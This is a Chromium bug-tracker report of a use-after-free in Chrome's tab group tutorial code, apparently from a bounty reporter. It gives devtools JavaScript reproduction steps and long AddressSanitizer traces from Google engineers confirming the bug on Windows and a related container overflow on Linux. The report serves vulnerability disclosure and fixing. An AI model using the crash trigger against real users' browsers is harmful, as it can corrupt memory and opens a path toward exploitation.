# use-after-free at browser_user_education_service.cc:120

| Field | Value |
|-------|-------|
| **Issue ID** | [340098902](https://issues.chromium.org/issues/340098902) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **Platforms** | Mac, Windows |
| **Chrome Version** | 126.0.6475.0 |
| **Reporter** | xp...@gmail.com |
| **Assignee** | es...@google.com |
| **Created** | 2024-05-13 |
| **Bounty** | $2,000.00 |

## Description

# Steps to reproduce the problem

0. Have only 1 tab open, open devtools, execute window.open(document.location). Close parent tab.
1. Visit chrome://tab-search.top-chrome/
2. In devtools execute:
   setInterval(()=>{
   document.querySelector("body > tab-search-app").apiProxy\_.startTabGroupTutorial()
   }, 30);
   setTimeout(()=>{
   window.close();
   }, 2500);

# Problem Description

UAF in destruction of object ~ScopedSavedTabGroupTutorialState.

# Summary

use-after-free at browser\_user\_education\_service.cc:120

# Custom Questions

#### Type of crash:

Browser

#### Reporter credit:

Sven Dysthe @svn\_dy

# Additional Data

Category: Security   

Chrome Channel: Canary   

Regression: N/A

## Attachments

- [asan_heap_buffer_overflow.txt](attachments/asan_heap_buffer_overflow.txt) (text/plain, 9.9 KB)
- [non-protected-uaf.txt](attachments/non-protected-uaf.txt) (text/plain, 27.4 KB)

## Timeline

### xp...@gmail.com (2024-05-13)

I am getting "Error while uploading." at the time of this report. I will attach the ASan report and a video reproduction once this issue is resolved on the Chromium bug tracker side.

### ad...@google.com (2024-05-13)

Sorry about the upload difficulties, I've reported it.

On M124 (1274542) following these instructions I get a `Container overflow` instead:

```
=================================================================
==2953==ERROR: AddressSanitizer: container-overflow on address 0x50300041e468 at pc 0x55e0629d4e77 bp 0x7ffd95d67300 sp 0x7ffd95d672f8
READ of size 8 at 0x50300041e468 thread T0 (chrome)
==2953==WARNING: invalid path to external symbolizer!
==2953==WARNING: Failed to use and restart external symbolizer!
    #0 0x55e0629d4e76 in GetForExtraction ./../../base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr.h:938:47
    #1 0x55e0629d4e76 in operator views::View * ./../../base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr.h:630:59
    #2 0x55e0629d4e76 in views::View::PropagateVisibilityNotifications(views::View*, bool) ./../../ui/views/view.cc:3309:29
    #3 0x55e0629d4e2b in views::View::PropagateVisibilityNotifications(views::View*, bool) ./../../ui/views/view.cc:3310:14
    #4 0x55e0629d4e2b in views::View::PropagateVisibilityNotifications(views::View*, bool) ./../../ui/views/view.cc:3310:14
    #5 0x55e0629d4e2b in views::View::PropagateVisibilityNotifications(views::View*, bool) ./../../ui/views/view.cc:3310:14
    #6 0x55e0629d4e2b in views::View::PropagateVisibilityNotifications(views::View*, bool) ./../../ui/views/view.cc:3310:14
    #7 0x55e062a3e769 in views::Widget::OnNativeWidgetVisibilityChanged(bool) ./../../ui/views/widget/widget.cc:1604:11
    #8 0x55e062b1eb11 in views::DesktopWindowTreeHostPlatform::HideImpl() ./../../ui/views/widget/desktop_aura/desktop_window_tree_host_platform.cc:868:28
    #9 0x55e0623b12b3 in aura::WindowTreeHost::Hide() ./../../ui/aura/window_tree_host.cc:334:3
    #10 0x55e062b15de4 in views::DesktopWindowTreeHostPlatform::Close() ./../../ui/views/widget/desktop_aura/desktop_window_tree_host_platform.cc:381:3
    #11 0x55e062a2f511 in views::Widget::CloseWithReason(views::Widget::ClosedReason) ./../../ui/views/widget/widget.cc:809:21
    #12 0x55e0702ab39b in Browser::TabStripEmpty() ./../../chrome/browser/ui/browser.cc:1382:12
    #13 0x55e0704d0e81 in TabStripModel::SendDetachWebContentsNotifications(TabStripModel::DetachNotifications*) ./../../chrome/browser/ui/tabs/tab_strip_model.cc:567:16
    #14 0x55e0704da1f9 in TabStripModel::CloseTabs(base::span<content::WebContents* const, 18446744073709551615ul, content::WebContents* const*>, unsigned int) ./../../chrome/browser/ui/tabs/tab_strip_model.cc:1999:5
    #15 0x55e0704db27d in TabStripModel::CloseWebContentsAt(int, unsigned int) ./../../chrome/browser/ui/tabs/tab_strip_model.cc:756:3
    #16 0x55e070334d77 in chrome::CloseWebContents(Browser*, content::WebContents*, bool) ./../../chrome/browser/ui/browser_tabstrip.cc:110:31
    #17 0x55e0547d1efa in content::WebContentsImpl::Close() ./../../content/browser/web_contents/web_contents_impl.cc:8234:16
    #18 0x55e05404b604 in Invoke<void (content::RenderFrameHostImpl::*)(content::RenderFrameHostImpl::ClosePageSource), const base::WeakPtr<content::RenderFrameHostImpl> &, content::RenderFrameHostImpl::ClosePageSource> ./../../base/functional/bind_internal.h:738:12
    #19 0x55e05404b604 in MakeItSo<void (content::RenderFrameHostImpl::*)(content::RenderFrameHostImpl::ClosePageSource), std::__Cr::tuple<base::WeakPtr<content::RenderFrameHostImpl>, content::RenderFrameHostImpl::ClosePageSource> > ./../../base/functional/bind_internal.h:954:5
    #20 0x55e05404b604 in void base::internal::Invoker<base::internal::FunctorTraits<void (content::RenderFrameHostImpl::*&&)(content::RenderFrameHostImpl::ClosePageSource), base::WeakPtr<content::RenderFrameHostImpl>&&, content::RenderFrameHostImpl::ClosePageSource&&>, base::internal::BindState<true, true, false, void (content::RenderFrameHostImpl::*)(content::RenderFrameHostImpl::ClosePageSource), base::WeakPtr<content::RenderFrameHostImpl>, content::RenderFrameHostImpl::ClosePageSource>, void ()>::RunImpl<void (content::RenderFrameHostImpl::*)(content::RenderFrameHostImpl::ClosePageSource), std::__Cr::tuple<base::WeakPtr<content::RenderFrameHostImpl>, content::RenderFrameHostImpl::ClosePageSource>, 0ul, 1ul>(void (content::RenderFrameHostImpl::*&&)(content::RenderFrameHostImpl::ClosePageSource), std::__Cr::tuple<base::WeakPtr<content::RenderFrameHostImpl>, content::RenderFrameHostImpl::ClosePageSource>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>) ./../../base/functional/bind_internal.h:1067:14
    #21 0x55e04dc5e669 in Run ./../../base/functional/callback.h:156:12
    #22 0x55e04dc5e669 in blink::mojom::LocalMainFrame_ClosePage_ForwardToCallback::Accept(mojo::Message*) ./gen/third_party/blink/public/mojom/frame/frame.mojom.cc:19082:26
    #23 0x55e05cb6b4e4 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1016:41
    #24 0x55e05cb87047 in mojo::MessageDispatcher::Accept(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #25 0x55e05cb6ff45 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) ./../../mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:706:20
    #26 0x55e05d92d34f in IPC::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification) ./../../ipc/ipc_mojo_bootstrap.cc:1181:24
    #27 0x55e05d92ea33 in Invoke<void (IPC::ChannelAssociatedGroupController::*)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), scoped_refptr<IPC::ChannelAssociatedGroupController>, mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification> ./../../base/functional/bind_internal.h:738:12
    #28 0x55e05d92ea33 in MakeItSo<void (IPC::ChannelAssociatedGroupController::*)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), std::__Cr::tuple<scoped_refptr<IPC::ChannelAssociatedGroupController>, mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification> > ./../../base/functional/bind_internal.h:930:12
    #29 0x55e05d92ea33 in RunImpl<void (IPC::ChannelAssociatedGroupController::*)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), std::__Cr::tuple<scoped_refptr<IPC::ChannelAssociatedGroupController>, mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification>, 0UL, 1UL, 2UL> ./../../base/functional/bind_internal.h:1067:14
    #30 0x55e05d92ea33 in base::internal::Invoker<base::internal::FunctorTraits<void (IPC::ChannelAssociatedGroupController::*&&)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), IPC::ChannelAssociatedGroupController*&&, mojo::Message&&, IPC::(anonymous namespace)::ScopedUrgentMessageNotification&&>, base::internal::BindState<true, true, false, void (IPC::ChannelAssociatedGroupController::*)(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification), scoped_refptr<IPC::ChannelAssociatedGroupController>, mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:980:12
    #31 0x55e05b4b1174 in Run ./../../base/functional/callback.h:156:12
    #32 0x55e05b4b1174 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:203:34
    #33 0x55e05b512baf in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:11)> ./../../base/task/common/task_annotator.h:90:5
    #34 0x55e05b512baf in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #35 0x55e05b511b99 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #36 0x55e05b51396a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #37 0x55e05b67d899 in base::MessagePumpGlib::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_glib.cc:694:48
    #38 0x55e05b5146af in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:641:12
    #39 0x55e05b4445cf in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #40 0x55e052e6c022 in content::BrowserMainLoop::RunMainMessageLoop() ./../../content/browser/browser_main_loop.cc:1104:18
    #41 0x55e052e736fc in content::BrowserMainRunnerImpl::Run() ./../../content/browser/browser_main_runner_impl.cc:159:15
    #42 0x55e052e62b68 in content::BrowserMain(content::MainFunctionParams) ./../../content/browser/browser_main.cc:34:28
    #43 0x55e058c33f30 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:708:10
    #44 0x55e058c37962 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool) ./../../content/app/content_main_runner_impl.cc:1299:10
    #45 0x55e058c3700e in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1144:12
    #46 0x55e058c313d0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:333:36
    #47 0x55e058c31a4b in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:346:10
    #48 0x55e049868de8 in ChromeMain ./../../chrome/app/chrome_main.cc:192:12
    #49 0x7f15c9629d8f in __libc_init_first ??:?

0x50300041e468 is located 24 bytes inside of 32-byte region [0x50300041e450,0x50300041e470)
allocated by thread T0 (chrome) here:
    #0 0x55e04986670d in operator new(unsigned long) _asan_rtl_:3
    #1 0x55e0629f4f11 in __libcpp_operator_new<unsigned long> ./../../third_party/libc++/src/include/new:271:10
    #2 0x55e0629f4f11 in __libcpp_allocate ./../../third_party/libc++/src/include/new:295:10
    #3 0x55e0629f4f11 in allocate ./../../third_party/libc++/src/include/__memory/allocator.h:125:32
    #4 0x55e0629f4f11 in __allocate_at_least<std::__Cr::allocator<base::raw_ptr<views::View, (partition_alloc::internal::RawPtrTraits)1> > > ./../../third_party/libc++/src/include/__memory/allocate_at_least.h:41:19
    #5 0x55e0629f4f11 in __split_buffer ./../../third_party/libc++/src/include/__split_buffer:343:25
    #6 0x55e0629f4f11 in std::__Cr::vector<base::raw_ptr<views::View, (partition_alloc::internal::RawPtrTraits)1>, std::__Cr::allocator<base::raw_ptr<views::View, (partition_alloc::internal::RawPtrTraits)1> > >::insert(std::__Cr::__wrap_iter<base::raw_ptr<views::View, (partition_alloc::internal::RawPtrTraits)1> const*>, base::raw_ptr<views::View, (partition_alloc::internal::RawPtrTraits)1>&&) ./../../third_party/libc++/src/include/vector:1616:49
    #7 0x55e0629f3de2 in views::View::AddChildViewAtImpl(views::View*, unsigned long) ./../../ui/views/view.cc:3109:30
    #8 0x55e070df3b39 in AddChildView<(anonymous namespace)::ContentsSeparator> ./../../ui/views/view.h:454:5
    #9 0x55e070df3b39 in AddChildView<(anonymous namespace)::ContentsSeparator> ./../../ui/views/view.h:438:12
    #10 0x55e070df3b39 in BrowserView::BrowserView(std::__Cr::unique_ptr<Browser, std::__Cr::default_delete<Browser> >) ./../../chrome/browser/ui/views/frame/browser_view.cc:951:23
    #11 0x55e070fe70e7 in BrowserWindow::CreateBrowserWindow(std::__Cr::unique_ptr<Browser, std::__Cr::default_delete<Browser> >, bool, bool) ./../../chrome/browser/ui/views/frame/browser_window_factory.cc:61:14
    #12 0x55e07029f0c9 in CreateBrowserWindow ./../../chrome/browser/ui/browser.cc:314:10
    #13 0x55e07029f0c9 in Browser::Browser(Browser::CreateParams const&) ./../../chrome/browser/ui/browser.cc:550:29
    #14 0x55e07029d9f8 in Browser::Create(Browser::CreateParams const&) ./../../chrome/browser/ui/browser.cc:461:14
    #15 0x55e07046b7fb in StartupBrowserCreatorImpl::OpenTabsInBrowser(Browser*, chrome::startup::IsProcessStartup, std::__Cr::vector<StartupTab, std::__Cr::allocator<StartupTab> > const&) ./../../chrome/browser/ui/startup/startup_browser_creator_impl.cc:273:15
    #16 0x55e07046e826 in StartupBrowserCreatorImpl::RestoreOrCreateBrowser(std::__Cr::vector<StartupTab, std::__Cr::allocator<StartupTab> > const&, StartupBrowserCreatorImpl::BrowserOpenBehavior, unsigned int, chrome::startup::IsProcessStartup, bool) ./../../chrome/browser/ui/startup/startup_browser_creator_impl.cc:683:13
    #17 0x55e07046a831 in StartupBrowserCreatorImpl::DetermineURLsAndLaunch(chrome::startup::IsProcessStartup, bool) ./../../chrome/browser/ui/startup/startup_browser_creator_impl.cc:476:22
    #18 0x55e07046991c in StartupBrowserCreatorImpl::Launch(Profile*, chrome::startup::IsProcessStartup, std::__Cr::unique_ptr<OldLaunchModeRecorder, std::__Cr::default_delete<OldLaunchModeRecorder> >, bool) ./../../chrome/browser/ui/startup/startup_browser_creator_impl.cc:194:7
    #19 0x55e0704605aa in StartupBrowserCreator::LaunchBrowser(base::CommandLine const&, Profile*, base::FilePath const&, chrome::startup::IsProcessStartup, chrome::startup::IsFirstRun, std::__Cr::unique_ptr<OldLaunchModeRecorder, std::__Cr::default_delete<OldLaunchModeRecorder> >, bool) ./../../chrome/browser/ui/startup/startup_browser_creator.cc:719:9
    #20 0x55e070461762 in StartupBrowserCreator::LaunchBrowserForLastProfiles(base::CommandLine const&, base::FilePath const&, chrome::startup::IsProcessStartup, chrome::startup::IsFirstRun, StartupProfileInfo, std::__Cr::vector<Profile*, std::__Cr::allocator<Profile*> > const&, bool) ./../../chrome/browser/ui/startup/startup_browser_creator.cc:799:7
    #21 0x55e07045ff60 in StartupBrowserCreator::ProcessCmdLineImpl(base::CommandLine const&, base::FilePath const&, chrome::startup::IsProcessStartup, StartupProfileInfo, std::__Cr::vector<Profile*, std::__Cr::allocator<Profile*> > const&) ./../../chrome/browser/ui/startup/startup_browser_creator.cc:1335:3
    #22 0x55e07045e073 in StartupBrowserCreator::Start(base::CommandLine const&, base::FilePath const&, StartupProfileInfo, std::__Cr::vector<Profile*, std::__Cr::allocator<Profile*> > const&) ./../../chrome/browser/ui/startup/startup_browser_creator.cc:670:10
    #23 0x55e05a0f3d7b in ChromeBrowserMainParts::PreMainMessageLoopRunImpl() ./../../chrome/browser/chrome_browser_main.cc:1774:25
    #24 0x55e05a0f28af in ChromeBrowserMainParts::PreMainMessageLoopRun() ./../../chrome/browser/chrome_browser_main.cc:1229:18
    #25 0x55e052e68f8e in content::BrowserMainLoop::PreMainMessageLoopRun() ./../../content/browser/browser_main_loop.cc:1014:28
    #26 0x55e052e70173 in Invoke<int (content::BrowserMainLoop::*)(), content::BrowserMainLoop *> ./../../base/functional/bind_internal.h:738:12
    #27 0x55e052e70173 in MakeItSo<int (content::BrowserMainLoop::*)(), std::__Cr::tuple<base::internal::UnretainedWrapper<content::BrowserMainLoop, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > > ./../../base/functional/bind_internal.h:930:12
    #28 0x55e052e70173 in RunImpl<int (content::BrowserMainLoop::*)(), std::__Cr::tuple<base::internal::UnretainedWrapper<content::BrowserMainLoop, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> >, 0UL> ./../../base/functional/bind_internal.h:1067:14
    #29 0x55e052e70173 in base::internal::Invoker<base::internal::FunctorTraits<int (content::BrowserMainLoop::*&&)(), content::BrowserMainLoop*>, base::internal::BindState<true, true, false, int (content::BrowserMainLoop::*)(), base::internal::UnretainedWrapper<content::BrowserMainLoop, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> >, int ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:980:12
    #30 0x55e054614319 in Run ./../../base/functional/callback.h:156:12
    #31 0x55e054614319 in content::StartupTaskRunner::RunAllTasksNow() ./../../content/browser/startup_task_runner.cc:42:29
    #32 0x55e052e68050 in content::BrowserMainLoop::CreateStartupTasks() ./../../content/browser/browser_main_loop.cc:917:25
    #33 0x55e052e72dea in content::BrowserMainRunnerImpl::Initialize(content::MainFunctionParams) ./../../content/browser/browser_main_runner_impl.cc:140:15
    #34 0x55e052e62acf in content::BrowserMain(content::MainFunctionParams) ./../../content/browser/browser_main.cc:30:32
    #35 0x55e058c33f30 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:708:10
    #36 0x55e058c37962 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool) ./../../content/app/content_main_runner_impl.cc:1299:10
    #37 0x55e058c3700e in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1144:12
    #38 0x55e058c313d0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:333:36
    #39 0x55e058c31a4b in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:346:10
    #40 0x55e049868de8 in ChromeMain ./../../chrome/app/chrome_main.cc:192:12
    #41 0x7f15c9629d8f in __libc_init_first ??:?

HINT: if you don't care about these errors you may set ASAN_OPTIONS=detect_container_overflow=0.
If you suspect a false positive see also: https://github.com/google/sanitizers/wiki/AddressSanitizerContainerOverflow.
SUMMARY: AddressSanitizer: container-overflow (/home/adetaylor/Extended-124/chrome+0x27881e76) (BuildId: 5451f7b4196fab49)
Shadow bytes around the buggy address:
  0x50300041e180: 00 00 00 fa f7 fa fa fa fa fa f7 fa fa fa fa fa
  0x50300041e200: f7 fa fa fa fa fa f7 fa 00 00 00 00 f7 fa 00 00
  0x50300041e280: 00 00 f7 fa 00 00 00 04 f7 fa fd fd fd fd f7 fa
  0x50300041e300: 00 00 00 fc f7 fa 00 00 00 fc f7 fa 00 00 00 00
  0x50300041e380: f7 fa 00 00 00 fa f7 fa 00 00 00 fa f7 fa 00 00
=>0x50300041e400: 00 00 f7 fa 00 00 00 00 f7 fa 00 00 00[fc]f7 fa
  0x50300041e480: fa fa fa fa f7 fa fa fa fa fa f7 fa 00 00 00 00
  0x50300041e500: f7 fa 00 00 00 fa f7 fa 00 00 00 00 f7 fa 00 00
  0x50300041e580: 00 00 f7 fa 00 00 00 fa f7 fa 00 00 00 fa f7 fa
  0x50300041e600: 00 00 00 00 f7 fa 00 00 00 00 f7 fa 00 00 00 fa
  0x50300041e680: f7 fa 00 00 00 00 f7 fa 00 00 00 00 f7 fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==2953==ADDITIONAL INFO

==2953==Note: Please include this section with the ASan report.
Task trace:
    #0 0x55e05d921323 in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*) ./../../ipc/ipc_mojo_bootstrap.cc:1120:13
    #1 0x55e05cbeccf7 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) ./../../mojo/public/cpp/system/simple_watcher.cc:102:13


==2953==END OF ADDITIONAL INFO
==2953==ABORTING

```

I'll see if I get the same or different on Canary.

### ad...@google.com (2024-05-13)

I got the same container overflow on Canary.

The container overflow doesn't involve `browser_education_service`. I therefore judge it to be a different root cause. I've filed the container overflow issue as issue 340170017. Since you alerted us to the way to reproduce it, I've set you as the Reporter field, so if that bug is also deemed to be security-consequential (probably not, but I'm not sure yet) that will go to the VRP panel for assessment too.

Back on this use-after-free: I suspect that I may be able to reproduce this on Windows - I'll try that next.

### ad...@google.com (2024-05-13)

With `asan-win32-release_x64-1299854.zip` on Windows, I can indeed reproduce the UaF:

```
=================================================================
==16684==ERROR: AddressSanitizer: heap-use-after-free on address 0x12187fe2de80 at pc 0x7ffbe54b9aa9 bp 0x0049f67fe380 sp 0x0049f67fe3c8
READ of size 1 at 0x12187fe2de80 thread T0
==16684==WARNING: Failed to use and restart external symbolizer!
    #0 0x7ffbe54b9aa8 in base::internal::`anonymous namespace'::CrashImmediatelyOnUseAfterFree C:\b\s\w\ir\cache\builder\src\base\memory\raw_ptr_asan_hooks.cc:53
    #1 0x7ffbe54b96c8 in base::internal::`anonymous namespace'::SafelyUnwrapForDereference C:\b\s\w\ir\cache\builder\src\base\memory\raw_ptr_asan_hooks.cc:76
    #2 0x7ffbe8de84c9 in `anonymous namespace'::ScopedSavedTabGroupTutorialState::~ScopedSavedTabGroupTutorialState C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\user_education\browser_user_education_service.cc:120
    #3 0x7ffbdbed1173 in user_education::TutorialService::~TutorialService C:\b\s\w\ir\cache\builder\src\components\user_education\common\tutorial_service.cc:44
    #4 0x7ffbe4133242 in UserEducationService::~UserEducationService C:\b\s\w\ir\cache\builder\src\chrome\browser\user_education\user_education_service.cc:115
    #5 0x7ffbe41332ef in UserEducationService::~UserEducationService C:\b\s\w\ir\cache\builder\src\chrome\browser\user_education\user_education_service.cc:115
    #6 0x7ffbde942ced in KeyedServiceFactory::Disassociate C:\b\s\w\ir\cache\builder\src\components\keyed_service\core\keyed_service_factory.cc:118
    #7 0x7ffbde943120 in KeyedServiceFactory::ContextDestroyed C:\b\s\w\ir\cache\builder\src\components\keyed_service\core\keyed_service_factory.cc:129
    #8 0x7ffbe2113e7d in DependencyManager::PerformInterlockedTwoPhaseShutdown C:\b\s\w\ir\cache\builder\src\components\keyed_service\core\dependency_manager.cc:161
    #9 0x7ffbe0cf6c5f in ProfileImpl::~ProfileImpl C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_impl.cc:954
    #10 0x7ffbe0cfacbf in ProfileImpl::~ProfileImpl C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_impl.cc:900
    #11 0x7ffbe0d27306 in ProfileDestroyer::DestroyOriginalProfileNow C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_destroyer.cc:273
    #12 0x7ffbe0d299c8 in OriginalProfileDestroyer::DoDestroyUnderlyingProfile C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_destroyer.cc:105
    #13 0x7ffbe0d25547 in ProfileDestroyer::Start C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_destroyer.cc:326
    #14 0x7ffbe0d24771 in ProfileDestroyer::DestroyOriginalProfileWhenAppropriateWithTimeout C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_destroyer.cc:152
    #15 0x7ffbe0d2424c in ProfileDestroyer::DestroyOriginalProfileWhenAppropriate C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_destroyer.cc:121
    #16 0x7ffbdd475a61 in ProfileManager::ProfileInfo::~ProfileInfo C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_manager.cc:1612
    #17 0x7ffbdd47d2fa in std::__Cr::__tree<std::__Cr::__value_type<base::FilePath,std::__Cr::unique_ptr<ProfileManager::ProfileInfo,std::__Cr::default_delete<ProfileManager::ProfileInfo> > >,std::__Cr::__map_value_compare<base::FilePath,std::__Cr::__value_type<base::FilePath,std::__Cr::unique_ptr<ProfileManager::ProfileInfo,std::__Cr::default_delete<ProfileManager::ProfileInfo> > >,std::__Cr::less<base::FilePath>,1>,std::__Cr::allocator<std::__Cr::__value_type<base::FilePath,std::__Cr::unique_ptr<ProfileManager::ProfileInfo,std::__Cr::default_delete<ProfileManager::ProfileInfo> > > > >::destroy C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:1544
    #18 0x7ffbdd47ed11 in ProfileManager::~ProfileManager C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_manager.cc:475
    #19 0x7ffbdd47b29f in ProfileManager::~ProfileManager C:\b\s\w\ir\cache\builder\src\chrome\browser\profiles\profile_manager.cc:447
    #20 0x7ffbe4835b24 in BrowserProcessImpl::StartTearDown C:\b\s\w\ir\cache\builder\src\chrome\browser\browser_process_impl.cc:517
    #21 0x7ffbe0bdfe29 in ChromeBrowserMainParts::PostMainMessageLoopRun C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1938
    #22 0x7ffbd6f66c4a in content::BrowserMainLoop::ShutdownThreadsAndCleanUp C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1164
    #23 0x7ffbd6f6d68b in content::BrowserMainRunnerImpl::Shutdown C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:180
    #24 0x7ffbd6f5c9d0 in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:43
    #25 0x7ffbdbf7b47e in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:717
    #26 0x7ffbdbf7e5bf in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1309
    #27 0x7ffbdbf7de67 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1154
    #28 0x7ffbdbf7984d in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:332
    #29 0x7ffbdbf7a33d in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:345
    #30 0x7ffbceef1601 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:192
    #31 0x7ff7441e43a5 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:181
    #32 0x7ff7441e1db2 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:350
    #33 0x7ff7445c0583 in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #34 0x7ffc54c87343 in BaseThreadInitThunk+0x13 (C:\Windows\System32\KERNEL32.DLL+0x180017343)
    #35 0x7ffc55ec26b0 in RtlUserThreadStart+0x20 (C:\Windows\SYSTEM32\ntdll.dll+0x1800526b0)

0x12187fe2de80 is located 0 bytes inside of 1160-byte region [0x12187fe2de80,0x12187fe2e308)
freed by thread T0 here:
    #0 0x7ff7442bca0d in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82
    #1 0x7ffbe06e94bb in Browser::~Browser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser.cc:637
    #2 0x7ffbe400c98c in BrowserView::~BrowserView C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\browser_view.cc:1066
    #3 0x7ffbe4035959 in BrowserView::`vector deleting destructor'+0x19 (C:\Users\adetaylor\Canary-126\chrome.dll+0x195145959)
    #4 0x7ffbdd259c2e in views::View::~View C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:291
    #5 0x7ffbee4f64a3 in BrowserFrameViewWin::~BrowserFrameViewWin C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\browser_frame_view_win.cc:122
    #6 0x7ffbee4ffabf in BrowserFrameViewWin::~BrowserFrameViewWin C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\browser_frame_view_win.cc:122
    #7 0x7ffbdd2174ec in views::NonClientView::~NonClientView C:\b\s\w\ir\cache\builder\src\ui\views\window\non_client_view.cc:179
    #8 0x7ffbdd2195cf in views::NonClientView::~NonClientView C:\b\s\w\ir\cache\builder\src\ui\views\window\non_client_view.cc:175
    #9 0x7ffbdd25e1ea in views::View::DoRemoveChildView C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:3215
    #10 0x7ffbdd25e626 in views::View::RemoveAllChildViews C:\b\s\w\ir\cache\builder\src\ui\views\view.cc:371
    #11 0x7ffbdd22db3a in views::Widget::DestroyRootView C:\b\s\w\ir\cache\builder\src\ui\views\widget\widget.cc:2132
